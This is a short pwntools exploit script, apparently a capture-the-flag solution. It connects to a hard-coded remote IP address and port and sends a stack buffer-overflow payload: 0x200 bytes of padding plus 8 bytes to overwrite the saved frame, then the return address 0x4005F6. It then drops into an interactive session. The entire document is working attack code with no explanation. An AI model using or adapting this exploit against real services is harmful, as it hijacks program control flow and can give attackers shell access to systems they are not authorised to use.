from pwn import *
p = remote("61.147.171.105",63931)
context(os = 'linux' , log_level = "debug")
payload = b"a"*0x200 + b"a"*8 + p64(0x4005F6)
p.sendafter("is:",payload)
p.interactive()
